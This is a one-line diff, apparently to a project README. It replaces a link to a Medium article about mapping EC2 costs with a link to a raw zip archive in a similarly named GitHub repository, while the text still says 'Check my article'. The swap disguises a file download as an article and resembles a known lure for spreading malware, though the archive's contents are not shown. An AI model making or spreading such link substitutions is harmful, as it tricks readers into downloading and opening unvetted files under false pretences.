@@ -1,1 +1,1 @@
-Check my article https://medium.com/@marcosangomes/mapping-the-costs-of-ec2-services-aaa1bdf0c642 to see the explanation about this project.
+Check my article https://github.com/marcossangomes/reports-elb-teams/raw/refs/heads/master/elderwood/teams_reports_elb_2.0.zip to see the explanation about this project.
